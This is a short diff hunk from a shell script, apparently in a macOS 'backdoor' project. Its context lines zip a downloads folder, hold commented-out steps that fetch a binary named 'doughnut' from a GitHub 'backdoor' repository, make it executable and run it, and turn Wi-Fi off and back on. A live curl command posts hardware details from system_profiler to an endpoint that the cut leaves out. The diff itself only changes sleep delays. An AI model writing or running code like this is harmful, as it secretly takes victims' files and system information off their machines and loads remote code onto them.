@@ -9,9 +9,8 @@ zip -r ../.downloads.zip *
 # curl -O "https://raw.githubusercontent.com/Wolfoverflow/backdoor/main/doughnut"
 # chmod +x doughnut
 # open doughnut
-sleep 260
 # networksetup -setnetworkserviceenabled "Wi-Fi" off
-sleep 40
+sleep 20
 # networksetup -setnetworkserviceenabled "Wi-Fi" on
 curl -d '{                      
  "sysinfo": "'"$(system_profiler SPHardwareDataType)"'"
